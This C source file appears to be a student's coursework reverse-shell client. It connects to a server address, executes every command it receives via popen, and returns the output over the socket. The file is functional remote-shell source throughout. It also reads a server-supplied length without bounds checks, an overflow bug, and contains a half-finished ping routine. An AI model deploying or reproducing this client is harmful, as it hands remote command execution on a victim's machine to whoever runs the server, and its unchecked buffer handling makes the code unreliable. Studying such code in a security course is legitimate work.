#include "reverse-shell.h"
#include "client.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>

// The only way i could figure out how to quit the program
// was by using signals. When looking up the documentation
// i could not find a way to pass arguments to the signal handler.
// Thats why i store these as global variables.
int client_side_socket;
bool client_is_running = false;

client_command* read_command(void);
bool handle_incoming_requests(void);
char* execute_terminal_command(const char *cmd);
void client_sig_int_handler(int signal_nr);
void run_client(void);
void shut_down_client(void);
bool ping_server(void);
void client_respond_to_ping(void);

void create_client_socket(const char *server_host, int server_port) {
    printf("Creating client socket at: %s:%d\r\n", server_host, server_port);
    signal(SIGINT, client_sig_int_handler);

    client_side_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(client_side_socket < 0) {
        perror("Error opening client socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in socket_address = {0};
    socket_address.sin_family = AF_INET;
    socket_address.sin_port = htons(server_port);
    socket_address.sin_addr.s_addr = inet_addr(server_host);

    if(connect(client_side_socket, (struct sockaddr *) &socket_address, 
        sizeof(socket_address)) < 0) {
        perror("Error connecting client socket");
        exit(EXIT_FAILURE);
    }

    run_client();    
}

void run_client(void) {
    client_is_running = true;

    while(client_is_running) {
        // if(!ping_server()) 
        //     break;

        handle_incoming_requests();
    }

    shut_down_client();
}

// Checks if the server is still running.
// by sending an empty character to the server.
bool ping_server(void) {
    char buf;

    if (recv(client_side_socket, &buf, sizeof(buf), 0) == -1) {
        return false;
    }

    return true;
}

// Should respond to ping from the server.
void client_respond_to_ping(void) {
    int pong_length = strlen(PONG_MESSAGE);
    char pong_message[pong_length];
        
    if(send(client_side_socket, &pong_length, sizeof(pong_length), 0) == -1){
        perror("Error sending pong message");
        exit(EXIT_FAILURE);
    }
}
// When CTRL + C is pressed this handler is invoked.
// Calls stop_client to quit the program.
void client_sig_int_handler(int signal_nr) {
    if(client_is_running) {
        signal(SIGINT, client_sig_int_handler);
        shut_down_client();    
    }
}

// Stops the client by closing the socket.
void shut_down_client(void) {
    if(!client_is_running)
        return;

    printf("Shutting down client..\r\n");

    if(client_side_socket != 0 && close(client_side_socket) < 0) {
        perror("Error closing client connection");
    }

    client_is_running = false;
    printf("Client successfully shut down..\r\n");
    exit(EXIT_SUCCESS);
}

// Reads command sent from the server and 
// constructs the struct to hold info about the command.
client_command* read_command(void) {
    client_command *cmd = malloc(sizeof(client_command));
    if(cmd == NULL)
        return NULL;
 
    // client_respond_to_ping();

    if(recv(client_side_socket, &cmd->content_length, sizeof(cmd->content_length), 0) == -1) {
        perror("Error reading header"); 
        return NULL;
    }

    printf("Incoming command has %d number of bytes\r\n", cmd->content_length);

    cmd->content_body[cmd->content_length] = '\0';
    if(recv(client_side_socket, cmd->content_body, cmd->content_length, 0) == -1) {
        perror("Error reading body content");
        free(cmd);
        return NULL;
    }

    return cmd;
}

/*
    Handles command sent by the server in the following steps:
    - Read header from server
        - Handle error
    - Reader content body(terminal command) from server
        - Handle error
    - Check the command actually contains anything
    - Execute the terminal command recieved using execute_terminal_command
    - Send the response header back to the server
    - Send the content body back to the server
*/
bool handle_incoming_requests(void) {
    client_command *cmd = read_command();
    if(cmd == NULL)
        return false;

    char *response = execute_terminal_command(cmd->content_body);
    int response_length = strlen(response);

    printf("Is this really the length: %d\r\n", response_length);
    printf("And the response is: %s\r\n", response);

    if(send(client_side_socket, &response_length, sizeof(response_length), 0) == -1) {
        perror("Error sending header to the server.");
        exit(EXIT_FAILURE);
    }
    
    if(send(client_side_socket, response, response_length, 0) == -1) {
        perror("Error sending body content to the server.\r\n");
        exit(EXIT_FAILURE);
    }

    free(response);
    free(cmd);
    response = NULL;
    cmd = NULL;

    return true;
}

// This function is copied from the link below(provided by lecturer), with a few modifictions:
// http://www.eastwill.no/pg3401/eksamen_v23_oppgave5_exec.c
char* execute_terminal_command(const char *cmd) {
    if(cmd == NULL)
        return NULL;

    FILE* terminal_stream = NULL;
    char *response = malloc(sizeof(char) * MAX_CLIENT_RESPOSE);
    
    if (response == NULL) 
        return NULL;

    memset(response, 0, MAX_CLIENT_RESPOSE);
    response[0] = '\0';

    terminal_stream = popen(cmd, "r");

    int remaining_bytes = MAX_CLIENT_RESPOSE - 1;

    if (terminal_stream == NULL) {
        sprintf(response, "Error: Failed to execute command");
    } else {
        char buffer[MAX_CLIENT_RESPOSE];
    
        // Continue reading response from the terminal_stream until bytes-remaining
        // is higher than zero or the end of the stream is reached.
        while (remaining_bytes > 0 && fgets(buffer, remaining_bytes, terminal_stream) != NULL) {
            strncat(response, buffer, remaining_bytes); // Append the buffer to the response
            remaining_bytes = MAX_CLIENT_RESPOSE - strlen(response) - 1; // Calculate bytes left
        }

        response[MAX_CLIENT_RESPOSE - remaining_bytes] = '\0';
        pclose(terminal_stream);
    }

    return response;
}